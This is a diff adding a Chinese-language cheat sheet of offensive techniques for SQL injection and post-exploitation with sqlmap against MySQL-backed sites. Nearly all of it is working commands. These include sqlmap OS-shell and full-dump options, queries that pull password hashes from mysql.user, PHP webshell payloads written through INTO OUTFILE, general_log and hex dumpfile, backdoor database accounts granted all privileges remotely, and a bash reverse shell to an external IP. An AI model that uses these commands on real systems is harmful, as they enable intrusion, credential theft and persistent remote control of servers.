@@ -1,0 +1,93 @@
+
+sqlmap实战经验：
+当有root，尝试：
+系统访问权限
+ --os-cmd=OSCMD //执行操作系统命令
+ --os-shell //反弹一个 osshell
+ --os-pwn //pwn，反弹 msf 下的 shell 或者 vnc
+ --os-smbrelay //反弹 msf 下的 shell 或者 vnc
+ --os-bof //存储过程缓存溢出
+ --priv-esc //数据库提权
+
+获取关键tables，获取账号密码，可能需要破解。
+找后台地址，登录。
+后台找上传等漏洞尝试。
+
+常用：sqlmap -u url --smart --batch -a自动进行注入 其中-a指尝试一切。 注：会获取大量数据，be careful.
+
+尝试--sql-shell 获取信息
+ select host,user,password from mysql.user 获取密码等
+若 host 值是“%”，则能通过远程连接进行管理。
+
+
+select @@datadir命令 ：获取数据库数据保存的位置.
+select load_file('D:/EmpireServer/web/index.php')    读文件
+注：在使用 load_file 函数进行读取文件时，一定要进行“D:\EmpireServer\web”符号的转换，即将“\”换成“/”，否则无法读取。
+如：select load_file('D:/EmpireServer/web/index.php')  
+继续，查看代码是否存在文件包含等。
+
+写入文件：
+select '<?php  @eval($_POST[cmd])  ?>' INTO OUTFILE 'D:/Evas/web/z.php'
+或读写数据库文件：
+update mysql.user set mysql.host='%' where mysql.user='127.0.0.1';
+
+尝试直接添加一个账号和远程授权：
+CREATE USER newuser@'%' IDENTIFIED BY '123456';
+grant all privileges on *.* to newuser@'%' identified by "123456" with grant option;
+FLUSH PRIVILEGES;
+
+通过sql写入shell条件：
+1.网站必须是 root 权限
+2.需知道网站的绝对路径
+3.GPC 为 off，也即php关于特殊字符主动转义的功能需关闭.
+
+
+思路三：通过写入日志。
+general_log_file 获取 webshell 尝试：
+（1）查看 genera 文件配置情况
+show global variables like "%genera%";
+（2）关闭 general_log
+set global general_log=off;
+（3）通过 general_log 选项来获取 webshell
+set global general_log='on';
+SET global general_log_file='D:/EmpireServer/web/cmd.php';
+（4）执行查询
+SELECT '<?php assert($_POST["cmd"]);?>';
+这里一般会失败，然后就写入日志了。
+
+
+SELECT ... INTO OUTFILE将选定的行写入文件。
+SELECT ... INTO DUMPFILE 在没有任何格式的情况下将单行写入文件。
+
+
+尝试hex写入：
+如：select unhex('wdadw496945949594dwdalz') into dumpfile  'D:/EmpireServer/web/22.php' 其中里面是hex格式.
+
+root账号密码直接登3389.
+
+
+案例二：
+导出多少条数据：
+sqlmap.py -u url -D tourdata -T userb -C "email,Username,userpassword" --start 1 --stop 10 --dump 
+即第1行开始，第10行结束.
+
+--dump-all  全部导出.
+密码多半为md5加密。
+
+
+案例三：
+获取shell：
+1.直接连接数据库：
+sqlmap.py -d "mysql://root:123456@127.0.0.1:3306/mysql" --os-shell
+2.通过选择 32 位或者 64 位操作系统，通过os-shell执行：
+bash -i >& /dev/tcp/192.168.1.3/8080 0>&1 反弹shell.
+3.反弹到服务器 192.168.1.3，实际中192.168.1.3为外网独立 IP.
+4.通过 echo 命令(linux命令)生成 shell：
+echo "<?php @eval($_POST['chopper']);?>" >/data/www/phpmyadmin/1.php
+若能通过 phpmyadmin 管理数据库，则可以修改 host 为“%”并执行权限更新。
+参考：
+use mysql;
+update user set host = '%' where user = 'root';
+FLUSH PRIVILEGES;
+注：若数据库有多个host连接，则可能出现问题。
+
